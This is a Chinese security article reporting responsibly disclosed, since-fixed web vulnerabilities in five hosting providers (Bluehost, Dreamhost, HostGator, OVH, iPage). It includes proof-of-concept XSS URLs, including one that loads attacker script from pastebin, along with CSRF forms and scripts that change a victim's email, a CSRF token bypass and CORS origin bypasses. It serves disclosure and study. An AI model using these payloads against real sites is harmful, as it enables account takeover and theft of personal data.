***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

**![01.png](https://image.3001.net/images/20190219/1550567630_5c6bc8ce50c87.png!small)**
**最近，我们在对Bluehost、Dreamhost、HostGator、OVH和iPage5家流行的网站托管服务商（进行安全测试，目的在于发现这些网站托管平台是否存在一些可导致被入侵的漏洞。最终，不幸的是，经测试发现，这5家网站托管平台都至少存在一种简单可利用的客户端漏洞，可导致对注册用户的账号劫持和信息泄露。**

值得注意的是，这5家网站托管平台都占据着大量的用户市场份额，我们经常聘请专业渗透人员进行测试，希望我们的测试结果提供给广大用户最真实的安全参考。测试完毕后，我们会及时把存在上漏洞通报给相关公司和厂商，让他们进行必要的修复整改。本次测试由安全人员Paulos
Yibelo独立完成，他此前曾发现了大量软硬件产品漏洞。

## Bluehost存在多个信息泄露和账号劫持漏洞

### CORS错误配置导致的信息泄露漏洞

> 严重性：高危
>
> 影响:
> 攻击者可以利用这些漏洞窃取：用户个人身份信息（PII），如姓名、地址（城市、街道、州、国家）、手机号码、邮编等；部分支付详细信息，如信用卡过期年月、后四位数、绑定姓名、开卡类型和支付方法等；能直接登录用户托管使用的WordPress、Mojo、SiteLock等网站管理系统的认证令牌。

Bluehost使用了CORS策略进行跨站资源共享，CORS不同于同源策略SOP，可以在浏览器间实现网站的跨域通信，众所周知，某些CORS配置非常危险，而且有些配置很容易形成误解。

在观察到Bluehost的API服务端对特定网站域允许CORS之后，我们就开始寻求绕过过滤器的方法，尝试从目标网站中获取到敏感信息。

形如以下带有HTTP响应头的消息说明，bluehost主机网站具备CORS策略：

    
    
    Access-Control-Allow-Origin:
    
    <https://my.bluehost.com/>

[](https://my.bluehost.com/)

也就是说，如果某个网站的响应消息如上，其表示，允许<https://my.bluehost.com/>来读取该网站上的内容。经测试发现，Bluehost配置了不严谨的正则表达式规则，比如，如果浏览器客户端用<https://my.bluehost.com.evil.com>发起请求，Bluehost会给出以下响应：

    
    
    Access-Control-Allow-Origin:
    
    <https://my.bluehost.com.evil.com>

[](https://my.bluehost.com.evil.com)

可以看到，Bluehost只检查了请求网站的前面字符串，只要匹配bluehost.com即可。这也就是说，恶意攻击者可以通过自行控制的域名如my.bluehost.com.EVILWEBSITE.com，来用EVILWEBSITE.com下的真正的恶意网站读取Bluehost的网站内容。

另外，通过测试我们还发现，Bluehost的API中会返回一些涉及用户身份和技术配置的零散信息，从这些信息中，我们可以获取到Bluehost托管用户的相关认证
token 信息。

测试如下：

首先，在/api/users服务端这里，攻击者可以获取到用户的user_id，然后利用这个user_id来查询相关的用户账户和网站内容信息，从这些信息中，攻击者最终可获取到用户的邮箱、姓名、地址和WordPress、Mojo、SiteLock等托管网站管理系统的认证token。

![02.png](https://image.3001.net/images/20190219/1550566560_5c6bc4a077d04.png!small)如上结果显示，攻击者并非使用了Bluehost托管网站，而是实际使用了托管在evilwebsite.com上的恶意网站来发起恶意请求，但Bluehost的API响应中却允许了这一数据读取操作行为。

### 对CSRF的不当JSON请求验证导致的账号劫持漏洞

> 严重性：高危
>
> 影响：攻击者构造一个恶意链接或网站，迷惑Bluehost用户进行点击，
> 然后利用该漏洞可以修改任意Bluehost用户受害者的邮箱地址，以此用密码重置方式获取受害者账户的完全控制权。

由于Bluehost的请求处理和身份验证机制存在不当配置，形成了该漏洞。理论上来说，当Bluehost用户想更改他们如姓名、手机号、地址、邮箱等个人注册信息时，会向Bluehost后端发起以下请求：

![03.png](https://image.3001.net/images/20190219/1550566593_5c6bc4c1a20e5.png!small)仔细观察可以看到，请求中未包含任何的token值，也就是说，任意网站都可向这个Bluehost后端发起跨域请求，实现个人信息更改。

但由于请求是包含在JSON数据中的，正常来说，这种跨域更改不可能实现，还有人会想到利用Adobe Flash
Player来发送跨域更改请求，但Flash上已经禁用这类功能了。在这里，我们可以构造一种特殊的技巧，利用Bluehost后端的错误配置，无需利用Flash成功实现更改请求的发送：

    
    
    <form id="xsrf" action="<https://my.bluehost.com/cgi/account_center/api/profile>" method="post" enctype="text/plain">
    
    <input name='{"country":"US","phone":"+1.NEWPHONE","street1":"NEW STREET","last_name":"LastName","email":"NEW@EMAIL.com","city":"N EW","postal_code":"0000","province":"WA","first_name":"FirstName ' value='","organization":null}' type='hidden'> The    above HTML code will generate a JSON request similar to the one we need, {"country":"US","phone":"+1.NEWPHONE","street1":"NEW STREET","last_name":"LastName","email":"NEW@EMAIL.com","city":"N EW","postal_code":"0000","province":"WA","first_name":"FirstName    =”, organization":null}

上述input
name后等号内的一串信息就是个人用户注册信息，我们可以把FirstName的value值换为等号，然后把其它值加入到organization”:null属性值中去。

可以看到，上述请求是以Content-Type: text/plain，而不是Content-Type:
application/json来发送的，但Bluehost服务端并不作严格检查过滤，所以最后可以有效实现cross-origin跨域。

正常流程，Bluehost服务端会检查 Referrer 头中的网站域名信息是否属于bluehost.com，如果不是，Bluehost
服务端会拒绝请求并响应500类型错误。这种检查可在meta标签中使用Content=”no-referrer”来很容易地绕过，这样的话，Bluehost服务端就能允许请求了。

### 不当的CORS验证导致的中间人攻击漏洞

> 严重性：中危
>
>
> 影响：尽管Bluehost利用了SSL/HTTPS来加密通信，但攻击者利用该漏洞，可潜伏在目标网络的WIFI或局域网中，嗅探Bluehost内部用户的明文通信。

该漏洞主要由于CORS错误配置导致 ，当其它请求源读取Bluehost网站内容时，这种情况下，Bluehost不对协议和相关机制作出验证，如下：

![04.png](https://image.3001.net/images/20190219/1550566741_5c6bc555ac34c.png!small)在上述请求响应中可看到，Bluehost托管网站授权了一个HTTP请求源进行内容读取，且响应消息中允许该HTTP请求源网站不加密地读取Bluehost托管网站内容，这种降级攻击导致Bluehost自身的SSL认证机制失效无用，并违背了使用HTTPS机制的整体原则。

### my.bluehost.com上可导致账号劫持的XSS漏洞

> 严重性：高危
>
>
> 影响：攻击者利用该漏洞可以bluehost.com客户端用户身份执行命令，实现对托管网站内容和注册邮箱的增删查改操作。托管网站的注册用户只要点击了攻击者构造了恶意链接，或是访问是攻击者指向了恶意网站，其个人注册信息就会被窃取。

![05.png](https://image.3001.net/images/20190219/1550566788_5c6bc584bcc04.png!small)这其中，由两个低危问题导致了这个严重漏洞，第一个问题是Bluehost在用户邮箱更改时不需要用户密码确认，也就是说，任何人使用XSS漏洞即可实现用户邮箱地址和密码重置；第二个就是，
Bluehost在Cookie消息中未作HttpOnly
标记，导致攻击者可以构造恶意JavaScript窃取Cookie消息内容，然后利用这些Cookie内容实现合法的用户认证。

PoC：

    
    
    https://my.bluehost.com/cgi/dm/subdomain/redirect?domainkey=”><script>alert(document.d omain)</script>

测试视频如下：

## Dreamhost存在的XSS和信息泄露漏洞

### XSS漏洞导致的账号劫持漏洞

> 严重性：高危
>
> 影响：攻击者可利用该漏洞，迷惑受害者点击恶意链接或访问网站方式，达到更改注册用户的邮箱或密码。

漏洞Payload:

    
    
    https://panel.dreamhost.com/tree=domain.manage&ampcurrent_step=Index&next_step=ShowAddhttp&domain=:lol”><svg/onload=alert()        will generate an alert on panel.dreamhost.com (profile and website management)

由于DreamHost本身当用户更改邮箱时无需密码确认，所以，进一步利用上述漏洞方式，可实现账号劫持。另外，深入利用该XSS漏洞，还可执行CSRF攻击，劫持任意账户。

    
    
    $.ajax({
    
    url: "[https://panel.dreamhost.com/id/?tab=contact&command=edit](https://panel.dreamhost.com/id/?tab=contact&command=edit)",
    
    method: "POST",
    
    dataType: "html",
    
    success: function(response)
    
    {
    
    var security_cookie =
    
    $(response).find("input[name='security_cookie']").val();
    
    $.post( "<https://panel.dreamhost.com/id/?>", { tab: "contact",
    
    command: "submit_edit", security_cookie :security_cookie, prefix : "", first
    
    : "Santa", middle : "", last : "Bluh", suffix : "", street1 : "Nurit 103",
    
    street2 : "", city : "Ora", state : "jerusalem" , zip : "90880" , country :
    
    "IL" , email : "attacker@gmail.com",phone:"+954.8888777",fax: "", chat :"",
    
    twitter:"",url:""}).done(function( data ) {
    
    console.log( data );
    
    });
    
    console.log(security_cookie);
    
    },
    
    error: function(error)
    
    {
    
    console.log($error);
    
    }
    
    });

在上述JavaScript中，panel.dreamhost.com服务端会把登录用户的邮箱更改为attacker@gmail.com，我们可以把这段JS代码放到共享网站<http://pastebin.com/raw/65CayjA7>，然后利用该XSS漏洞，间接实现对注册用户的邮箱更改。最终的构造链接如下：

    
    
    https://panel.dreamhost.com/tree=domain.manage¤t_step=Index&next_step=ShowAddhttp&domain=:lol%22%3E%0A%3Cscript%20async%20src=%22//pastebin.com/raw/65CayjA7%22%3E%3C/script%3E%0A%3Cscript%3E%20var%20x%20=%20%22/*

当受害者点击访问了上述链接之后，其原先邮箱就会被更改为攻击者自定义的邮箱。

测试视频如下：

## HostGator的CSRF防护绕过和信息泄露漏洞

### 全站CSRF防护机制绕过漏洞

> 严重性：高危
>
>
> 影响：该漏洞存在于HostGator服务网站的所有用户涉及区域。攻击者构造一个恶意链接或网站，迷惑HostGator用户进行点击访问，触发该漏洞实现对注册用户信息的增删查改操作，其中包括对注册邮箱和个人信息的更改。

HostGator服务端自身应用了anti-CSRF
token来对任意形式的提交操作进行验证，但是，把POST参数中的token更改为token[]=，或是把其值置空之后，HostGator服务端的CSRF检查为true，CSRF防护机制会被绕过。我怀疑这是一种欺骗类型漏洞，如以下伪代码所示：

    
    
    if (strcasecmp($_GET['token'],"$csrf_token") == 0) {

上述字符串比较函数中，只有两个字符串一样时值才为0。但也存在如空引用的数组类型赋值，这样就会返回一个NULL，而根据PHP比较规则来看，NULL实际就为0，这样的话，比较值也为真，也可有效通过CSRF检查。如下

    
    
    data=changeaction&token[]=

HostGator服务端的另外一种anti-CSRF
token是一种基于referrer的检查机制，这种检查为查看请求是否来自[http://portal.hostgator.com/anything](http://portal.hostgator.com/anything?)？之类的请求端，但是，利用开放重定向技巧也很容易绕过这种限制。

### 多处CORS错误配置导致的信息泄露和HTTPHTTP拆分注入攻击

 **A.信息泄露**

> 严重性：高危Moderately High
>
> 影响：由于CORS错误配置，攻击者可以读取来自HostGator的API响应消息，这些API响应消息中包含了全面的注册用户和网站配置信息。

如下：

![06.jpg](https://image.3001.net/images/20190219/1550567093_5c6bc6b5d31dc.jpg!small)上图可以看出，在HostGator响应消息的Access-Control-Allow-Origin区域中，允许攻击者控制网站evil.com读取API响应内容。

漏洞原因在于HostGator的校验规则不够完善，它只检查放行具备.hostgator.com结尾的网站域名，像<http://evil.com/?null=portal.hostgator.com>和evil.com\@.hostgator.com这样的也可绕过其校验机制，也即只要在.hostgator.com前添加任意字段都行。

 **B.在Microsoft Edge和Internet Explorer浏览器中的CRLF注入漏洞**

> 严重性：一般
>
> 影响：该漏洞只会对使用Microsoft Edge和Internet
> Explorer浏览器的HostGator用户产生影响，攻击者利用该漏洞可以注入新的头消息，或执行客户端脚本。

事实上，这里任意在请求中发送的字符响应在CORS头消息中后，都不带有任何编码或对\r这样的非法字符校验机制。也就是说，由于IE和Edge浏览器都把\r
(0x0d)认为是一个有效的HTTP头消息终止符，因此，针对IE和Edge浏览器用户来说，这里就存在HTTP头注入漏洞了。

 **C.不当的CORS机制校验导致的中间人攻击漏洞**

> 严重性：中等
>
>
> 影响：尽管HostGator利用了SSL/HTTPS来加密通信，但攻击者利用该漏洞，可潜伏在目标网络的WIFI或局域网中，嗅探HostGator内部的API明文用户通信。

如HostGator信息泄露漏洞的Burp抓包截图中看到的那样，只要请求源以.hostgator.com结尾，Access-Control-Allow-Origin区域允许任意跨域请求，也就是说，只要跨域请求源为<http://anything.hostgator.com>，那么本地攻击者在任意协议或机制下，都可利用CORS方式读取到HTTPS响应内容。该漏洞意味着，任意HostGator子域名网站中存在的XSS类似漏洞都能有效被利用，而且，任意本地网络中的攻击者都能成功读取到CORS方式的响应内容。

PoC视频如下：

## OVH存在的CSRF防护机制绕过和信息泄露漏洞

> 严重性：高危
>
>
> 影响：该漏洞存在于整个网站中，攻击者利用该漏洞构造恶意链接或网站，迷惑受害者注册用户点击，即可实现对受害者注册用户信息的增删查改操作，包括更改邮箱和其它敏感个人信息。

OVH自身部署两种CSRF防护措施，一种是检查请求消息中的Content-Type是否为application/json，另一种为检查引用来源网站是否为“ovh.com”。从安全角度来讲，这两种措施还远远不够。虽然其它网站不会假冒或伪造这两种措施，但我们发现，可用简单的技巧来绕过它们。

    
    
    xhr.setRequestHeader(‘Content-Type’,’text/plain; application/json’);

在上述请求头设置中，如果Content-Type为application/json，浏览器会拒绝发送，如果Content-Type设置为’text/plain; application/json’，则浏览器会允许提交通过，貌似看来，OVH后端只对Content-Type是否包含application/json作出校验，如果包含，则请求可以通过。

在第二种referrer引用来源检查中，通常来说，这种referrer检查容易被误解和绕过。

在我们的OVH测试中，OVH服务端会检查请求源是否来自“ovh.com”，但并不验证HTTP和HTTPS协议，两种都被视为有效的referrer源协议。在任意的中间人攻击（MITM）场景中，攻击者可以利用DNS欺骗方式构建恶意的<http://ovh.com>网站，当受害者被迷惑访问之后，攻击者就会利用CSRF
payload执行到<https://ovh.com>
(HTTPS)的跳转。由于HTTP和HTTPS协议都被认为是可行的，所以这种referrer源的欺骗也是有效的。如果OVH执行的是HSTS策略，这种风险会被缓解。

这种基于referrer源的CSRF防护机制通常来说不痛不痒，很多主流浏览器都会把这种相关漏洞认为是低优先级漏洞，且不执行修复。例如，安全研究员Manuel
Caballero 就发现了Microsoft Edge的一个referrer
欺骗漏洞，该漏洞到现在都还没被Microsoft修复。网站在请求转发和发送用户数据时，该漏洞就能引发严重问题。

另外，在此，还得感谢Gmail邮箱机制，发送到myemail+2=@gmail.com样式的邮箱，最后实际上是被发送到了myemail@gmail.com
，所以，我们可以构造以下Content-Type为‘text/plain;
application/json’的头请求，实现在HTML框架下的邮箱地址更改。结合浏览器漏洞或MITM方式可成功实现对referrer源的欺骗。

    
    
    {“newEmail”:”myemail+2=@gmail.com”}

测试视频如下：

## iPage账号劫持和内容安全策略（CSP）绕过漏洞

### 账号劫持漏洞

> 严重性：高危
>
> 影响：攻击者可以利用该漏洞，构造恶意链接或网站，迷惑受害者点击访问，实现远程劫持任意iPage注册账户。

漏洞原因在于，
iPage密码更改页面中的一个奇怪功能，iPage后端不会对密码更改操作发起当前密码验证，也不会对用户请求相关的token信息进行校验。这也就是说，任意网站都能跨域方式向iPage发送针对受害者账户的密码更改请求，攻击者可以把受害者密码进行任意更改。存在漏洞的iPage服务端如下：

    
    
    https://www1.ipage.com/api/2.0/user/ipg.username/password

![07.png](https://image.3001.net/images/20190219/1550567353_5c6bc7b94b7c6.png!small)上述抓包请求中，
identifier为ipg.username，不带有任何referrer或任意token，也就是说，允许跨域实现账户劫持。

### 多种方式的CSP策略绕过漏洞

> 严重性：中危
>
> 影响：攻击者可以利用该漏洞在iPage的任意API响应中执行点击劫持攻击（Clickjacking），并且可以利用内容和脚本注入方式绕过CSP策略。

iPage自身应用了内容安全策略（CSP）来对API服务端进行防护，貌似这样可以阻止攻击者注入恶意内容，避免恶意脚本执行，而且，这种CSP策略下只允许某些页面构建嵌入（frame）API响应服务端。

大概样式如下：

    
    
    Content-Security-Policy: frame-ancestors ‘self’  http://*.impress.ly  http://*.dragndropbuilder.com  https://*.weeblycloud.com  https://*.sitelock.com  https://*.mojomarketplace.com  http://*.ipage.com  http://*.yourhostingaccount.com     https://*.ecwid.com
    
    X-Frame-Options: SAMEORIGIN  ALLOW-FROM  http://*.impress.ly  http://*.dragndropbuilder.com  https://*.weeblycloud.com  https://*.sitelock.com  https://*.mojomarketplace.com  http://*.ipage.com  http://*.yourhostingaccount.com     https://*.ecwid.com

如上所示，可见其中缺少了多个关键属性和组件内容，所以可导致：

 **A. CSP策略中frame-ancestors下的中间人攻击（MITM）**

frame-ancestors指令指定了一个可以包含<frame>，<iframe>，<object>，<embed>，or
<applet>等元素的有效父级。仔细观察上述CSP策略中，可发现frame-ancestors属性定义中，允许多个未加密的HTTP页面构建嵌入（frame），也就是说，潜伏在Wi-Fi或公共网络中的任意本地攻击者，通过这些网页网站的假冒，都可以构建嵌入（frame）到iPage的API服务端中。

虽然如IE11等一些主流浏览器并不支持CSP策略，但有X-Frame-Options头限制，不过，iPage后端仍然允许如http://*.impress.ly和http://*.ipage.com等样式的网站嵌入引用。

 **B. 缺少必要属性导致的CSP策略完全绕过**

在上述CSP策略中可看到，其缺少avaScript的有效来源指定标记script-src或object-src，这样的话，任意攻击者可以利用HTML注入漏洞来执行XSS跨站攻击。

测试视频如下：

## 总结

从上述测试结果可以发现，这5家网站托管服务商都存在一些简单可被利用的安全漏洞，很容易被黑客入侵控制，希望网站托管服务商能及时采取必要措施加以整改修复。对于用户自己来说，在选择网站托管服务平台时，更要对自身网站加强安全性，做足安全防护。

## 漏洞报送及响应

Dreamhost是在我们漏洞通报后，第一家给予我们反馈的服务商公司。他们的回复如下：

>
> 首先，感谢你们对我们存在漏洞的及时通报，我们认为这种负责任的漏洞披露方式能极大促进网络安全。目前，我们已经在我们自身的生产环境中修复了从panel.dreamhost.com/id/提交请求导致的CSRF漏洞，而且已增加了必要的安全措施，并对各个服务端的用户输入执行了过滤检查。

另外，由于Bluehost、iPage和HostGator都被主机提供商Endurance收购管理，所以，经向Endurance通报漏洞后，我们也收到了他们的反馈：

> 我们想告知你们的是，经过我们对你所报漏洞的内部分析后，我们已采取了相应措施来解决和修复相关的漏洞问题。

值得说明的是，在我们对Bluehost的测试验证过程中，由于我们测试账号有异常操作，被Bluehost探测关闭了。Bluehost干得好，但这可能有点晚了。

 ***参考来源：[websiteplanet](https://www.websiteplanet.com/blog/report-popular-hosting-hacked/)，clouds编译，转载请注明来自FreeBuf.COM**

